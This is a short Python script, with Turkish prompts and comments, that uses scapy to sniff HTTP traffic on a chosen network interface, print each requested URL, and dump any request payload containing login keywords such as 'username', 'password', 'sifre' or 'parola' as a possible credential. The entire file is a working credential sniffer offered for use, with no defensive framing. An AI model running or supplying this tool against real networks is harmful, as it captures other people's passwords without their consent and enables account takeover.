#!/usr/bin/env python
# -*- coding: utf-8 -*-

import scapy.all as scapy
from scapy.layers import http
import argparse


def arguman_al():
	parse=argparse.ArgumentParser()
	parse.add_argument("--interface",dest="interface",help=" Arayuz secimi")
	options=parse.parse_args()
	if not options.interface:
		parse.error('[-] Lütfen bir arayüz belirleyiniz,daha fazla bilgi için --help kullanın.')
	else:
		return options.interface	


def sniff(interface):
	scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)


def get_url(paket):
	return paket[http.HTTPRequest].Host+paket[http.HTTPRequest].Path


def get_login_info(paket):
	if paket.haslayer(scapy.Raw):
		load=paket[scapy.Raw].load
		keywords=["username","user","pass","password","sifre","ad","login","kullanici","kullaniciadi","kullaniciAdi","parola"]
		for keyword in keywords:
			if keyword in load:
				return load

def process_sniffed_packet(paket):
	if paket.haslayer(http.HTTPRequest):
		url=get_url(paket)
		print("[+] HTTP Request >> "+url)
		login_info=get_login_info(paket)
		if login_info:
			print("\n\n[+] Olası kullanıcı adı / Parola > "+login_info+"\n\n")


sniff(arguman_al())		